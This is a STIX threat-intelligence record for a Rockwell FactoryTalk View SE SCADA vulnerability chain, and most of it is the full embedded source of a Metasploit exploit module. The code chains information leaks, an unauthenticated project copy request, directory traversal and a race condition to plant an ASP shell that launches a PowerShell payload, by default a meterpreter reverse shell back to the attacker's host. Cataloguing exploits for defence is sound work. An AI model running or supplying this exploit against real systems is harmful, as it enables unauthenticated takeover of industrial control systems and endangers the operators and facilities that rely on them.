{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1b5e0950-0c34-4e29-bedb-8db35d82b6ad",
    "created": "2024-08-14T16:39:11.685074Z",
    "modified": "2024-08-14T16:39:11.685078Z",
    "name": "Rockwell FactoryTalk View SE SCADA Unauthenticated Remote Code Execution",
    "description": " This module exploits a series of vulnerabilities to achieve unauthenticated remote code execution on the Rockwell FactoryTalk View SE SCADA product as the IIS user. The attack relies on the chaining of five separate vulnerabilities. The first vulnerability is an unauthenticated project copy request the second is a directory traversal, and the third is a race condition. In order to achieve full remote code execution on all targets, two information leak vulnerabilities are also abused. This exploit was used by the Flashback team (Pedro Ribeiro + Radek Domanski) in Pwn2Own Miami 2020 to win the EWS category.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/rockwell_factorytalk_rce.rb",
            "external_id": "rockwell_factorytalk_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.thezdi.com/blog/2020/7/22/chaining-5-bugs-for-code-execution-on-the-rockwell-factorytalk-hmi-at-pwn2own-miami"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Miami_2020/replicant/replicant.md"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rdomanski/Exploits_and_Advisories/tree/master/advisories/Pwn2Own/Miami2020/replicant.md"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-12027"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-12028"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-12029"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Rockwell FactoryTalk View SE SCADA Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits a series of vulnerabilities to achieve unauthenticated remote code execution\n          on the Rockwell FactoryTalk View SE SCADA product as the IIS user.\n          The attack relies on the chaining of five separate vulnerabilities. The first vulnerability is an unauthenticated project copy request,\n          the second is a directory traversal, and the third is a race condition. In order to achieve full remote code execution on all\n          targets, two information leak vulnerabilities are also abused.\n          This exploit was used by the Flashback team (Pedro Ribeiro + Radek Domanski) in Pwn2Own Miami 2020 to win the EWS category.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability discovery and Metasploit module\n          'Radek Domanski <radek.domanski[at]gmail.com>' # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'URL', 'https://www.thezdi.com/blog/2020/7/22/chaining-5-bugs-for-code-execution-on-the-rockwell-factorytalk-hmi-at-pwn2own-miami'],\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Miami_2020/replicant/replicant.md'],\n          [ 'URL', 'https://github.com/rdomanski/Exploits_and_Advisories/tree/master/advisories/Pwn2Own/Miami2020/replicant.md'],\n          [ 'CVE', '2020-12027'],\n          [ 'CVE', '2020-12028'],\n          [ 'CVE', '2020-12029'],\n          [ 'ZDI', '20-727'],\n          [ 'ZDI', '20-728'],\n          [ 'ZDI', '20-729'],\n          [ 'ZDI', '20-730'],\n        ],\n        'Privileged' => false,\n        'Platform' => 'win',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Payload' => {\n          'DefaultOptions' =>\n            {\n              'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n            }\n        },\n        'DefaultOptions' => { 'WfsDelay' => 20 },\n        'Targets' => [\n          [ 'Rockwell Automation FactoryTalk SE', {} ]\n        ],\n        'DisclosureDate' => '2020-06-22',\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('SRVHOST', [true, 'IP address of the host serving the exploit']),\n        OptInt.new('SRVPORT', [true, 'Port of the host serving the exploit on', 8080]),\n        OptString.new('TARGETURI', [true, 'The base path to Rockwell FactoryTalk', '/rsviewse/'])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('SLEEP_RACER', [true, 'Number of seconds to wait for racer thread to finish', 15]),\n      ]\n    )\n  end\n\n  def send_to_factory(path)\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri, path),\n      'method' => 'GET'\n    })\n  end\n\n  def check\n    res = send_to_factory('/hmi_isapi.dll')\n    return Exploit::CheckCode::Safe unless res && res.code == 200\n\n    # Parse version from response body\n    # Example: Version 11.00.00.230\n    version = res.body.scan(/Version ([0-9.]{5,})/).flatten.first.to_s.split('.')\n\n    # Is returned version sound?\n    unless version.empty?\n      if version.length != 4\n        return Exploit::CheckCode::Detected\n      end\n\n      print_status(\"#{peer} - Detected Rockwell FactoryTalk View SE SCADA version #{version[0..3].join('.')}\")\n      if version[0].to_i == 11 && version[1].to_i == 0 && version[2].to_i == 0 && version[3].to_i == 230\n        # we know this exact version is vulnerable (11.00.00.230)\n        return Exploit::CheckCode::Appears\n      end\n\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def on_request_uri(cli, request)\n    if request.uri.include?(@shelly)\n      print_good(\"#{peer} - Target connected, sending payload\")\n      psh = cmd_psh_payload(\n        payload.encoded,\n        payload.arch.first\n        # without comspec it seems to fail, so keep it this way\n        # remove_comspec: true\n      )\n      # add double quotes for classic ASP escaping\n      psh.gsub!('\"', '\"\"')\n\n      # NOTE: ASP payloads are broken in newer Windows (Win 2012 R2, Win 10) so we need to use powershell\n      # This is because the MSF ASP payload uses WScript.Shell.run(), which doesn't seem to work anymore...\n      # If this module is not working on an older Windows version, try the below as payload:\n      # payload = Msf::Util::EXE.to_exe_asp(generate_payload_exe)\n      payload = %{<%CreateObject(\"WScript.Shell\").exec(\"#{psh}\")%>}\n      send_response(cli, payload)\n      # payload file is deleted automatically by the server once we win the race!\n\n    elsif request.uri.include?(@proj_name)\n      # Directory traversal: vulnerable asp file will land in the path we provide\n      print_good(\"#{peer} - Target connected, sending file path with dir traversal\")\n      # Check the comments in the Infoleak 2 (project installation path) to understand why\n      filename = \"../SE/HMI Projects/#{@shelly}\"\n      send_response(cli, filename)\n    end\n  end\n\n  def exploit\n    # Infoleak 1 (project listing)\n    print_status(\"#{peer} - Listing projects on the server\")\n    res = send_to_factory('/hmi_isapi.dll?GetHMIProjects')\n\n    fail_with(Failure::UnexpectedReply, 'Failed to obtain project list. Bailing') unless\n      res && res.code == 200 && res.body.include?('HMIProject')\n\n    print_status(\"#{peer} - Received list of projects from the server\")\n    @proj_name = nil\n    proj_path = ''\n    xml = res.get_xml_document\n\n    # Parse XML project list and check each project for installation project path\n    xml.search('HMIProject').each do |project|\n      # Infoleak 2 (project installation path)\n      # In the original exploit, we used this to calculate the directory traversal path, but\n      # Google says the path is the same for all versions since at least 2007.\n      # Let's still abuse it to check if the project is valid.\n      url = \"/hmi_isapi.dll?GetHMIProjectPath&#{project.attributes['Name']}\"\n      res = send_to_factory(url)\n\n      proj_path = res.body.strip\n\n      # Check if response contains :\\ that indicates a windows path\n      next unless proj_path.include?(':\\\\')\n\n      print_status(\"#{peer} - Found project path: #{proj_path}\")\n\n      # We only need first hit so we can quit the project parsing once we get it\n      if project.attributes['Name']\n        @proj_name = project.attributes['Name']\n        break\n      end\n    end\n\n    if !@proj_name\n      fail_with(Failure::UnexpectedReply, 'Failed to get a path from the XML to drop our shell, bailing out...')\n    end\n\n    shell_path = proj_path.sub(@proj_name, '').strip\n    print_good(\"#{peer} - Got a path to drop our shell: #{shell_path}\")\n\n    # Start http server for project copy callback\n    http_service = \"http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}\"\n    print_status(\"#{peer} - Starting up our web service on #{http_service} ...\")\n\n    start_service({\n      'Uri' => {\n        'Proc' => proc do |cli, req|\n          on_request_uri(cli, req)\n        end,\n        # This path has to be capitalized as \"RSViewSE\" or else the exploit will fail!\n        'Path' => '/RSViewSE/'\n      }\n    })\n\n    # Race Condition\n    # This is the racer thread. It will continuously access our asp file until it gets executed\n    print_status(\"#{peer} - Starting racer thread, let's win this race condition!\")\n    @shelly = \"#{rand_text_alpha(5..10)}.asp\"\n    racer = Thread.new do\n      loop do\n        res = send_to_factory(\"/#{@shelly}\")\n        if res.code == 200\n          print_good(\"#{peer} - We've won the race condition, shell incoming!\")\n          break\n        end\n      end\n    end\n\n    # Project Copy Request: target will connect to us to obtain project information.\n    print_status(\"#{peer} - Initiating project copy request...\")\n    url = \"/hmi_isapi.dll?StartRemoteProjectCopy&#{@proj_name}&#{rand_text_alpha(5..13)}&#{datastore['SRVHOST']}:#{datastore['SRVPORT']}&1\"\n    res = send_to_factory(url)\n\n    # wait up to datastore['SLEEP_RACER'] seconds for the racer thread to finish\n    count = 0\n    while count < datastore['SLEEP_RACER']\n      break if racer.status == false\n\n      sleep(1)\n      count += 1\n    end\n    racer.exit\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-06-22",
    "x_mitre_platforms": [
        "win'"
    ]
}